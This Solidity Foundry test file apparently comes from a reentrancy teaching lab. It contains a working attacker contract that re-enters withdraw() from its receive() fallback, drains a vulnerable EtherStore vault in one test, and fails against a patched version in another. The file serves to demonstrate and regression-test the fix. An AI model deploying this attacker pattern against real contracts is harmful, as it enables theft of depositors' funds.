// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {EtherStore} from "../../src/01-reentrancy/EtherStore.sol";
import {EtherStoreSafe} from "../../src/01-reentrancy/EtherStoreSafe.sol";

/// @notice Malicious contract used against the vulnerable EtherStore.
///         Same code is aimed at EtherStoreSafe to prove the fix holds.
contract ReentrancyAttacker {
    EtherStore public immutable target;
    EtherStoreSafe public immutable safeTarget;
    bool public immutable attackSafe;

    constructor(address target_, address safeTarget_, bool attackSafe_) {
        target = EtherStore(target_);
        safeTarget = EtherStoreSafe(safeTarget_);
        attackSafe = attackSafe_;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "seed at least 1 ETH");
        if (attackSafe) {
            safeTarget.deposit{value: msg.value}();
            safeTarget.withdraw();
        } else {
            target.deposit{value: msg.value}();
            target.withdraw();
        }
    }

    receive() external payable {
        if (attackSafe) {
            if (address(safeTarget).balance >= 1 ether) {
                safeTarget.withdraw();
            }
        } else {
            if (address(target).balance >= 1 ether) {
                target.withdraw();
            }
        }
    }
}

contract ReentrancyTest is Test {
    EtherStore internal vault;
    EtherStoreSafe internal safeVault;

    address internal alice = makeAddr("alice");
    address internal bob = makeAddr("bob");
    address internal carol = makeAddr("carol");

    function setUp() public {
        vault = new EtherStore();
        safeVault = new EtherStoreSafe();

        // Three honest depositors seed each vault with 6 ETH total. Whole-ether
        // amounts matter: the attacker withdraws 1 ETH per re-entry, so any wei
        // remainder would be left behind and the vault never reaches zero.
        for (uint256 i; i < 3; ++i) {
            address who = [alice, bob, carol][i];
            vm.deal(who, 10 ether);

            vm.prank(who);
            vault.deposit{value: 2 ether}();

            vm.prank(who);
            safeVault.deposit{value: 2 ether}();
        }
    }

    /// @dev The attack must succeed against the vulnerable vault.
    function test_Exploit_DrainsEtherStore() public {
        uint256 vaultBefore = address(vault).balance;
        assertGt(vaultBefore, 0, "vault should be seeded");

        ReentrancyAttacker attacker =
            new ReentrancyAttacker(address(vault), address(safeVault), false);
        vm.deal(address(this), 1 ether);
        attacker.attack{value: 1 ether}();

        uint256 vaultAfter = address(vault).balance;
        uint256 attackerBalance = address(attacker).balance;

        console2.log("vault balance before:", vaultBefore);
        console2.log("vault balance after :", vaultAfter);
        console2.log("attacker balance    :", attackerBalance);

        assertEq(vaultAfter, 0, "vault should be fully drained");
        assertGt(
            attackerBalance, vaultBefore, "attacker walked away with the deposit + honest funds"
        );
    }

    /// @dev The same attack must FAIL against the patched vault.
    function test_Fix_ExploitFails() public {
        uint256 vaultBefore = address(safeVault).balance;

        ReentrancyAttacker attacker =
            new ReentrancyAttacker(address(vault), address(safeVault), true);
        vm.deal(address(this), 1 ether);

        vm.expectRevert();
        attacker.attack{value: 1 ether}();

        uint256 vaultAfter = address(safeVault).balance;
        assertEq(vaultAfter, vaultBefore, "safe vault balance must not change on failed attack");
    }
}
